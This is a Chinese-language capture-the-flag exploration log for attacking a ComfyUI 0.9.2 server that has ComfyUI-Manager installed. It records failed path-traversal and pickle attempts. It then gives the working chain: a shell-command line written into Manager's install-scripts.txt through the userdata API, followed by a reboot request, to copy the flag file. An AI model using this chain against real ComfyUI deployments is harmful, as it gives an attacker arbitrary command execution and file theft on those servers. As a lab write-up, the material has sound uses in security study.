# c-02 · 探索记录

对应题解：[`c-02.md`](./c-02.md)

## 目标与起点

题目只说对 AI 推理服务做安全测试。容器地址上的 8188 在服务起来之后返回 ComfyUI 页面。`GET /system_stats` 写明版本是 `0.9.2`，前端是 `1.36.14`，启动参数是 `main.py --listen 0.0.0.0 --cpu`。同进程还加载了 ComfyUI-Manager `V3.37`，以及 `/ComfyUI/custom_nodes/websocket_image_save.py`。

下面第一、二阶段来自前一个任务窗口里已经关掉的实例。第三阶段在新令牌的实例上跑通，平台已接受 flag。

## 第一阶段：文件接口和数据节点

`/view` 不接受直接指向 `/challenge/flag.txt` 的文件名。带 `../` 的 `subfolder` 是 403，把点号写成 `....//` 之后变成 404，响应体是空的。

`LoadTrainingDataset` 的 `folder_name` 可以写成 `/challenge`。把它接到 `SaveLatent` 上之后，执行错误是 `No shard files found in /challenge`。`LoadImageTextDataSetFromFolder` 的 `folder` 不是自由字符串，下拉框里只有 `3d`；选 `3d` 时错误是 `No valid images found in input`。`Preview3D` 接受路径 `/challenge/flag.txt`，输出里只把这个路径原样放进 `result`，没有文件内容。

## 第二阶段：用户目录和 Manager

`GET /api/userdata` 必须带 `dir`。`dir=..` 和 `dir=/challenge` 都是 `Invalid directory`。`dir=workflows/..` 可以列出用户目录里的 `ComfyUI-Manager/config.ini`。用百分号编码的路径去读 `workflows/../../../challenge/flag.txt`，响应是 403，正文为空。

读出来的 `config.ini` 里，`security_level` 是 `normal`，`network_mode` 是 `public`。通过 userdata 把 `security_level` 改成 `weak` 之后，当时的进程仍然按旧配置拒绝 `POST /api/customnode/install/pip`，响应是 403。`GET /api/manager/reboot` 会让进程重新拉起，第一次重启后 8188 很快恢复。随后把一次本地安装放进启动脚本再重启，8188 在大约 40 秒内没有重新监听。那份实例被 close，平台重新 start 了一份。新实例的 `object_info` 里，自定义节点仍然只有 `SaveImageWebsocket` 和 ComfyUI-Manager 自带的节点。flag 没有出现在这些响应里。

这几轮请求当时都有正常的 HTTP 响应。8188 是在更后面才不再返回内容的。

## 第二阶段补充：服务仍在应答时又试过的几轮

`/internal/files/input` 只有 `example.png`，是 ComfyUI 自带的那张卡通图，文件里没有 `flag{...}`。`/internal/files/output` 只有占位文件名。

`EmptyImage` 接到 `SaveImageWebsocket` 之后执行成功。WebSocket 上多出来的是一张 8×8 的 PNG，和仓库里那份示例节点的行为一致，没有把 `/challenge/flag.txt` 带出来。

`/models/custom_nodes` 能列出 `websocket_image_save.py` 和 Manager 的源码文件名。这个列表接口不返回文件正文。

通过 userdata 上传 `shard_0000.pkl`，再让 `LoadTrainingDataset` 去读 `/ComfyUI/user/default`。PyTorch 2.10 拒绝加载，错误是 `weights_only` 以及 `Unsupported operand 149`。

`POST /api/manager/queue/install` 去装 `ComfyUI-text-file-util`。客户端等了 15 秒没有正文。日志写的是连 `raw.githubusercontent.com` 超时，然后改用本地节点清单。外网安装这条路没有装上任何节点。

同一段时间读了 Manager 的 `prestartup_script.py`。`install-scripts.txt` 的每一行是一个列表，第一项是已存在的工作目录，后面整段交给 `subprocess`。当时文件里已经放过的是 `pip install`，不是一条短命令。看清这个格式的时候，一次安装请求还卡在访问 GitHub，8188 开始只接受连接、不再返回 HTTP。上一轮任务窗口随后结束，`cp` 这一行没有在那份还活着的实例上发出去。

## 第三阶段：启动脚本在重启时执行

Manager 的预启动脚本会读取用户目录里的 `ComfyUI-Manager/startup-scripts/install-scripts.txt`。每一行用 `ast.literal_eval` 解析成列表。第一项是工作目录，必须已经存在；后面是 `subprocess` 的参数。执行完这份文件会被删除。

在新实例上写入一行：

```text
["/bin", "/bin/sh", "-c", "cp /challenge/flag.txt /ComfyUI/user/default/got_flag.txt"]
```

然后请求 `GET /api/manager/reboot`。连接被直接断开，这是进程替换的表现。8188 再次返回 200 之后，`GET /api/userdata/got_flag.txt` 的正文是 `flag{b8b477e4-0f35-4a1e-9a2f-7326047f11bb}`。平台接受，得分 500。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `/view` 用 `../` 或绝对路径读 flag | 读不到 | `filename` 带 `../` 是 400；`subfolder=/challenge` 是 403；响应体为空 |
| `LoadTrainingDataset` 指向 `/challenge` | 没有文件内容 | 执行错误是 `No shard files found in /challenge` |
| `LoadImageTextDataSetFromFolder` | 不能选挑战目录 | `folder: '/challenge' not in ['3d']`；`3d` 的错误是 `No valid images found in input` |
| `Preview3D` 的 `model_file` 写成 flag 路径 | 只回显路径 | `outputs` 是 `["/challenge/flag.txt", null, null]` |
| userdata 直接跳出用户目录 | 被拒绝 | `dir=..` 与编码后的 `../../../challenge/flag.txt` 都是 403 |
| 改 `security_level` 后立刻装包 | 仍被拒绝 | 配置文件已经写成 `weak`，`/api/customnode/install/pip` 仍是 403 |
| 把一次本地 pip 安装放进启动脚本再重启 | 服务没有在短时间内回来 | 重启请求得到空响应；之后约 40 秒内 8188 连接失败。后来用一条 `cp` 命令则能在重启后读到文件 |
| `torch.load` 读取自己放进去的 `shard_0000.pkl` | 没有执行命令 | PyTorch 2.10 报 `weights_only` 加载失败，`Unsupported operand 149` |
| `SaveImageWebsocket` | 只传出生成的图 | WebSocket 上是一张 8×8 PNG，没有 flag 文件 |
| 输入目录里的 `example.png` | 不是 flag | `/internal/files/input` 只有这一张自带卡通图，正文搜不到 `flag{` |
| 安装 `ComfyUI-text-file-util` | 没有装上 | 15 秒无正文；日志是连 `raw.githubusercontent.com` 超时，改走本地清单 |
| `/models/custom_nodes` 列出的 `.py` | 读不到正文 | 响应是文件名列表，没有文件内容 |

## 这次真正的收获

直接读 `/challenge/flag.txt` 被路径检查挡住。用户目录可以写入 Manager 的启动脚本。`/api/manager/reboot` 让预启动阶段执行这行 `cp`，flag 就出现在 `got_flag.txt` 里。

---

## 补充：2026-10-27 本轮的卡点

### 容器就绪是独立故障源

| 尝试 | 结果 | 判据 |
| --- | --- | --- |
| `GET :8188/system_stats` | 连续 `Failed to connect` | 进程还没起 |
| 轮询约 20 秒后同一请求 | 200，返回 `comfyui_version 0.9.2` | 就绪 |

不要用第一次 `refused` 判"服务不存在"。

### `reboot` 返回空响应是正常的

`GET /api/manager/reboot` 返回 `curl: (52) Empty reply from server`，
因为进程在响应前就把自己重启了。**判据**：随后轮询 `/system_stats` 恢复 200 即视为成功。

### 启动脚本的路径必须 URL 编码

`POST /api/userdata/{path}` 的 `path` 是 `ComfyUI-Manager/startup-scripts/install-scripts.txt`，
不编码会被当成路径分隔吃掉。编码后返回写入的路径字符串。

### 转机

写启动脚本（`["/bin","/bin/sh","-c","cp /challenge/flag.txt ..."]`）→ `reboot`
→ 轮询到就绪 → `GET /api/userdata/got_flag.txt`。
